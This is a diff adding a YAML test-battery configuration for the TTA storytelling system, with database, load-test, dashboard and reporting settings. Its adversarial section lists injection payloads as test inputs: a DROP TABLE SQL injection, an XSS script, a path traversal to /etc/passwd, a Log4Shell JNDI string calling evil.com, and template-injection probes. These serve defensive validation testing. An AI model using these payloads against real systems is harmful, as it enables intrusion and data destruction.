@@ -1,0 +1,264 @@
+# Comprehensive Test Battery Configuration
+# Configuration for TTA storytelling system comprehensive testing
+
+# Mock/Simulation Mode Settings
+mock_mode:
+  enabled: true  # Enable automatic fallback to mock implementations
+  force_mock: false  # Force mock mode even if real services are available
+  log_mock_operations: true  # Log mock operations for debugging
+  mock_data_size: "medium"  # small, medium, large - affects amount of mock data generated
+  preserve_mock_data: false  # Keep mock data between test runs
+
+# Test Execution Settings
+execution:
+  max_concurrent_tests: 5
+  test_timeout_seconds: 300
+  retry_failed_tests: false
+  stop_on_first_failure: false
+  
+# Database Configuration
+databases:
+  neo4j:
+    uri: "bolt://localhost:7687"
+    username: "neo4j"
+    password: "password"
+    database: "neo4j"
+    max_connection_pool_size: 50
+    connection_timeout: 30
+    # Mock fallback settings
+    mock_fallback: true
+    mock_data_size: "medium"  # small, medium, large
+
+  redis:
+    url: "redis://localhost:6379"
+    db: 0
+    max_connections: 20
+    connection_timeout: 10
+    # Mock fallback settings
+    mock_fallback: true
+    mock_data_persistence: false  # Keep mock data between tests
+
+# Standard Test Suite Configuration
+standard_tests:
+  user_profiles_count: 10
+  story_scenarios_count: 5
+  test_sessions_per_user: 3
+  character_creation_variations: 5
+  story_generation_timeout: 60
+  choice_consequence_depth: 3
+
+# Adversarial Test Suite Configuration
+adversarial_tests:
+  malformed_inputs_count: 20
+  injection_attack_variations: 15
+  boundary_condition_tests: 10
+  authentication_bypass_attempts: 8
+  session_hijacking_tests: 5
+  database_failure_simulations: 3
+  
+  # Input validation test patterns
+  injection_patterns:
+    - "'; DROP TABLE users; --"
+    - "<script>alert('xss')</script>"
+    - "../../etc/passwd"
+    - "${jndi:ldap://evil.com/a}"
+    - "{{7*7}}"
+    - "<%=7*7%>"
+  
+  # Boundary values for testing
+  boundary_values:
+    string_lengths: [0, 1, 255, 256, 1000, 10000, 100000]
+    numeric_ranges: [-2147483648, -1, 0, 1, 2147483647]
+    special_characters: ["'", '"', "<", ">", "&", "%", "\n", "\r", "\t"]
+
+# Load/Stress Test Suite Configuration
+load_stress_tests:
+  concurrent_users: [1, 5, 10, 20, 50]
+  test_duration_minutes: 5
+  ramp_up_time_seconds: 30
+  story_generation_rate_per_second: 2
+  memory_threshold_mb: 1000
+  cpu_threshold_percent: 80
+  
+  # Load test scenarios
+  scenarios:
+    - name: "normal_load"
+      concurrent_users: 10
+      duration_minutes: 3
+    - name: "peak_load"
+      concurrent_users: 25
+      duration_minutes: 2
+    - name: "stress_load"
+      concurrent_users: 50
+      duration_minutes: 1
+
+# Data Pipeline Validation Configuration
+data_pipeline_validation:
+  test_data_sets: 5
+  consistency_check_interval_seconds: 2
+  data_retention_test_duration_minutes: 1
+  cross_database_sync_timeout: 10
+  
+  # Pipeline stages to validate
+  validation_stages:
+    - "input_processing"
+    - "story_generation"
+    - "neo4j_storage"
+    - "redis_caching"
+    - "metrics_aggregation"
+    - "dashboard_updates"
+
+# Dashboard Verification Configuration
+dashboard_verification:
+  dashboard_base_url: "http://localhost:8000"
+  websocket_url: "ws://localhost:8000/ws"
+  refresh_rate_seconds: 2
+  response_time_threshold_ms: 1000
+  load_time_threshold_seconds: 3
+  
+  # Dashboard components to verify
+  components:
+    - name: "metrics_dashboard"
+      endpoint: "/dashboard/metrics"
+      refresh_rate: 2
+    - name: "user_activity_dashboard"
+      endpoint: "/dashboard/activity"
+      refresh_rate: 5
+    - name: "system_health_dashboard"
+      endpoint: "/dashboard/health"
+      refresh_rate: 1
+  
+  # Chart types to test
+  chart_types:
+    - "line_chart"
+    - "bar_chart"
+    - "pie_chart"
+    - "area_chart"
+    - "scatter_plot"
+
+# Test Data Generation
+test_data:
+  # User profile templates
+  user_profiles:
+    - name: "casual_player"
+      preferences: ["fantasy", "adventure"]
+      experience_level: "beginner"
+      session_duration_minutes: 15
+    - name: "experienced_player"
+      preferences: ["sci-fi", "mystery", "horror"]
+      experience_level: "advanced"
+      session_duration_minutes: 45
+    - name: "therapeutic_user"
+      preferences: ["healing", "mindfulness"]
+      experience_level: "intermediate"
+      session_duration_minutes: 30
+  
+  # Story scenario templates
+  story_scenarios:
+    - name: "fantasy_adventure"
+      genre: "fantasy"
+      complexity: "medium"
+      estimated_duration: 20
+    - name: "sci_fi_exploration"
+      genre: "sci-fi"
+      complexity: "high"
+      estimated_duration: 35
+    - name: "therapeutic_journey"
+      genre: "therapeutic"
+      complexity: "low"
+      estimated_duration: 25
+
+# Metrics Collection
+metrics:
+  collection_interval_seconds: 1
+  system_monitoring: true
+  performance_tracking: true
+  error_tracking: true
+  
+  # Metrics to collect
+  performance_metrics:
+    - "response_time"
+    - "throughput_rps"
+    - "error_rate"
+    - "cpu_usage"
+    - "memory_usage"
+    - "disk_io"
+    - "network_io"
+  
+  # Alert thresholds
+  thresholds:
+    response_time_ms: 2000
+    error_rate_percent: 5
+    cpu_usage_percent: 85
+    memory_usage_percent: 85
+
+# Reporting Configuration
+reporting:
+  output_directory: "./testing/results/comprehensive_battery"
+  generate_html_report: true
+  generate_csv_export: true
+  generate_json_export: true
+  include_metrics_data: true
+  include_performance_charts: false  # Requires additional dependencies
+  
+  # Report sections to include
+  report_sections:
+    - "executive_summary"
+    - "category_results"
+    - "detailed_test_results"
+    - "performance_analysis"
+    - "issue_identification"
+    - "recommendations"
+    - "metrics_data"
+
+# Environment-specific overrides
+environments:
+  development:
+    databases:
+      neo4j:
+        uri: "bolt://localhost:7687"
+      redis:
+        url: "redis://localhost:6379"
+    load_stress_tests:
+      concurrent_users: [1, 2, 5]
+      test_duration_minutes: 2
+  
+  staging:
+    databases:
+      neo4j:
+        uri: "bolt://staging-neo4j:7687"
+      redis:
+        url: "redis://staging-redis:6379"
+    load_stress_tests:
+      concurrent_users: [5, 10, 20]
+      test_duration_minutes: 3
+  
+  production:
+    databases:
+      neo4j:
+        uri: "bolt://prod-neo4j:7687"
+      redis:
+        url: "redis://prod-redis:6379"
+    load_stress_tests:
+      concurrent_users: [10, 25, 50]
+      test_duration_minutes: 5
+
+# Logging Configuration
+logging:
+  level: "INFO"
+  format: "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+  file_logging: true
+  console_logging: true
+  
+  # Log files
+  log_files:
+    main: "./testing/logs/comprehensive_battery.log"
+    metrics: "./testing/logs/metrics.log"
+    errors: "./testing/logs/errors.log"
+
+# Cleanup Configuration
+cleanup:
+  cleanup_test_data: true
+  cleanup_temp_files: true
+  preserve_failed_test_data: true
+  cleanup_timeout_seconds: 30
